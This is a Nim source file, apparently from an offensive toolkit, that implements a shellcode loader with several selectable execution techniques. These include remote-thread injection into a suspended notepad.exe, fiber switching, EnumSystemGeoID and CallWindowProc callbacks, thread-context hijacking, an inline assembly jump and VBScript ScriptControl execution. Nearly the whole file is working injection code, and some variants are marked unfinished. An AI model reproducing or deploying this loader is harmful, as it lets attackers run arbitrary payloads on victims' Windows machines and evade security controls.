import winim

# when not defined(USE_CRT) and not defined(USE_FIBRES) and not:
#     proc inject*[I, T](shellcode: array[I, T]): void =
#         echo "FUck"

when defined(USE_CRT):
    import osproc
    proc inject*[I, T](shellcode: array[I, T]): void = 
        let tProcess = startProcess("notepad.exe")
        tProcess.suspend()
        defer: tProcess.close()
        echo "[CRT] Target process: ", tProcess.processID

        let pHandle = OpenProcess(
            PROCESS_ALL_ACCESS, 
            false, 
            cast[DWORD](tProcess.processID)
        )
        defer: CloseHandle(pHandle)
        echo "[CRT] pHandle: ", pHandle

        let rPtr = VirtualAllocEx(
            pHandle,
            NULL,
            cast[SIZE_T](shellcode.len),
            MEM_COMMIT,
            PAGE_EXECUTE_READ_WRITE
        )
        var bytesWritten: SIZE_T
        let wSuccess = WriteProcessMemory(
            pHandle, 
            rPtr,
            unsafeAddr shellcode,
            cast[SIZE_T](shellcode.len),
            addr bytesWritten
        )
        echo "[CRT] WriteProcessMemory: ", bool(wSuccess)

        let tHandle = CreateRemoteThread(
            pHandle, 
            NULL,
            0,
            cast[LPTHREAD_START_ROUTINE](rPtr),
            NULL, 
            0, 
            NULL
        )
        defer: CloseHandle(tHandle)
        echo "[CRT] tHandle: ", tHandle
        echo "[CRT] Shellcode injected!"  

when defined(USE_FILE_EXECUTION):
    # TODO make the file that is written a valid exe (maybe use Delete Locked file technique by @jonasLyk)
    import osproc
    import os

    proc inject*[I, T](shellcode: array[I, T]): void =
        var exePath: string = "shellcode.exe"
        var outFile: File = open(exePath, fmWrite)
        outFile.write(shellcode)
        echo "[FILE_EXECUTION] File Written"
        outFile.close()

        # Launch the executable
        try:
            let tHandle = startProcess(exePath)
        finally:
            echo "[FILE_EXECUTION] TODO file invalid"
            if fileExists(exePath):
                removeFile(exePath)
                echo "[FILE_EXECUTION] TMP File Deleted"
            else:
                echo "[FILE_EXECUTION] TMP File Cannot be Deleted"

when defined(USE_FIBERS):
    proc inject*[I, T](shellcode: array[I, T]): void =
        let MasterFiber = ConvertThreadToFiber(NULL)
        echo "[FIBER] New Fiber Pointer: ", repr(MasterFiber)
        let vAlloc = VirtualAlloc(NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
        var bytesWritten: SIZE_T
        let pHandle = GetCurrentProcess()
        echo "[FIBER] pHandle: ", repr(pHandle)
        WriteProcessMemory(pHandle, vAlloc, unsafeaddr shellcode, cast[SIZE_T](shellcode.len), addr bytesWritten)
        echo "[FIBER] bytesWritten: ", repr(bytesWritten)
        let xFiber = CreateFiber(0, cast[LPFIBER_START_ROUTINE](vAlloc), NULL)
        echo "[FIBER] Fiber Execution Pointer: ", repr(xFiber)
        SwitchToFiber(xFiber)

when defined(USE_CALLBACKGEO):
    proc inject*[I, T](shellcode: array[I, T]): void =
        let tProcess = GetCurrentProcessId()

        echo "[Callback] Target Process: ", tProcess

        let rPtr = VirtualAlloc(
            nil,
            cast[SIZE_T](shellcode.len),
            MEM_COMMIT,
            PAGE_EXECUTE_READ_WRITE
        )

        if rPtr != nil:
            echo "[Callback] Allocated memory section RWX"

        copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len))
        echo "[Callback] shellcode copied into allocated memory section"
        
        # Callback execution
        EnumSystemGeoID(
            16,
            0,
            cast[GEO_ENUMPROC](rPtr)
        )
        echo "[GEOCALLBACK] Executed Shellcode"

#fix
when defined(USE_INLINE):
    proc inject*[I, T](shellcode: array[I, T]): void {.inline.} =
        let rPtr = unsafeAddr(shellcode[0])
        asm """
            mov rax, `rPtr`
            jmp rax
        """
        echo "[INLINE] Ran Provided ASM"

when defined(USE_CALLBACKWINPROC):
    proc inject*[I, T](shellcode: array[I, T]): void {.inline.} =
        let thread = GetCurrentThread();
        echo "[WINPROC] thread: ", repr(thread)
        let baseAddress = VirtualAlloc(NULL, len(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
        echo "[WINPROC] Memory Address: ", repr(baseAddress)
        RtlMoveMemory(baseAddress, unsafeAddr shellcode, len(shellcode))

        echo "[WINPROC] Memory Written: ", repr(baseAddress)
        let status = CallWindowProc(cast[WNDPROC](baseAddress), 0, 0, 0, 0)
        if status != 0:
            echo "[WINPROC] Callback Executed: true"
        else:
            echo "[WINPROC] Callback Executed: false"

when defined(USE_SETTHREADCONTEXT):
    const CONTEXT_FULL = 0x00000003
    const PAGE_EXECUTE_READWRITE = 0x40

    proc inject*[I, T](shellcode: array[I, T]): void {.inline.} =
        let thread = GetCurrentThread();
        echo "[SETCONTEXT] thread: ", thread
        let baseAddress = VirtualAlloc(NULL, len(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
        echo "[SETCONTEXT] Memory Address: ", repr(baseAddress)
        RtlMoveMemory(baseAddress, unsafeAddr shellcode, len(shellcode))
        var context: CONTEXT
        context.ContextFlags = CONTEXT_FULL
        GetThreadContext(thread, addr(context))
        context.Rip = cast[DWORD64](baseAddress)
        # echo "[SETCONTEXT] New Context: ", repr(context)
        echo "[SETCONTEXT] New Context: ", context.Rip
        SetThreadContext(thread, addr(context))

when defined(USE_VBSCRIPT):
    import strformat
    import system
    import winim/com

    when defined(amd64):
        echo "[VBSCRIPT EXECUTION] only supports windows i386 version"
        quit(1)

    proc inject*[I, T](shellcode: array[I, T]): void {.inline.} =
        var obj = CreateObject("MSScriptControl.ScriptControl")
        obj.allowUI = true
        obj.useSafeSubset = false

        obj.language = "VBScript"
        var buffer = ""
        for i in shellcode:
            #makes the shellcode into space seperated hex values for VBSCRIPT to parse
            buffer.add(fmt"{i:02X}")
        var vbs = fmt"""
            Dim shellcode
            shellcode = "{$buffer}"
            Dim buffer
            buffer = ""
            For i = 1 To Len(shellcode) Step 2
                buffer = buffer & Chr(CByte("&H" & Mid(shellcode, i, 2)))
            Next
            Dim exec
            Set exec = WScript.CreateObject("WScript.Shell")
            exec.Run buffer
        """

        obj.eval(vbs)
